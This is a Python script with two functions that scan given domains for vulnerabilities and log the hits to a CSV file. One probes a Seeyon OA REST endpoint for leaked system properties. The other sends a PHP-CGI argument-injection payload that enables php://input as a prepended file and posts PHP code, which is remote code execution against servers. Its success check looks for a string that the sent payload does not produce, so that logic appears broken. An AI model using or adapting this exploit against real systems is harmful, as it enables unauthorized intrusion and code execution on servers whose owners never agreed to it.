import os
import csv
import requests
# datas = ["url", "text"]
# file = "结果.csv"
# if os.path.exists(file):
#     with open("结果.csv", "a", encoding="UTF=8", newline='') as fp:
#         csv_w = csv.writer(fp)
#         csv_w.writerow(datas)
# else:
#     with open("结果.csv", "w", encoding="UTF=8", newline='') as fp:
#         csv_w = csv.writer(fp)
#         csv_w.writerow(datas)
def OA1(domain):
    response=None
    if (os.path.exists("zz.csv"))!=True:
        with open("zz.csv",'w',encoding="utf-8",newline='') as f:
            zz=csv.writer(f)
            zz.writerow(["url",'text'])
    try:
        response = requests.get(f'{domain}/seeyon/rest/m3/common/system/properties',timeout=5)
        if "appKey" in response.text:
            req=[domain]
            with open("zz.csv", "a", encoding="utf-8", newline="") as f:
                cvs_w = csv.writer(f)
                cvs_w.writerow(req)
            print("\033[33m[+]\033[0m"+domain+"\t"+"\033[33m存在漏洞\033[0m")
        else:
            print(domain)
    except:
        print(domain+"\t"+"400")

def PHPRce(domain):
    headers = {
        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0',
        'Upgrade-Insecure-Requests': '1',
        'REDIRECT-STATUS': '1',
        'Content-Type': 'application/x-www-form-urlencoded',
    }

    data = '<?php phpinfo();?>'
    try:
        response = requests.post(
            f'{domain}/php-cgi/php-cgi.exe?%add+allow_url_include%3d1+%add+auto_prepend_file%3dphp://input',
            headers=headers,
            data=data,
            verify=False,
            timeout=10
        )
        if "fkalis" in response.text:
            req=[domain]
            with open("zz.csv", "a", encoding="utf-8", newline="") as f:
                cvs_w = csv.writer(f)
                cvs_w.writerow(req)
            print("\033[33m[+]\033[0m"+domain+"\t"+"\033[33m存在漏洞\033[0m")
        else:
            print(domain)
    except:
        print(domain + "\t" + "400")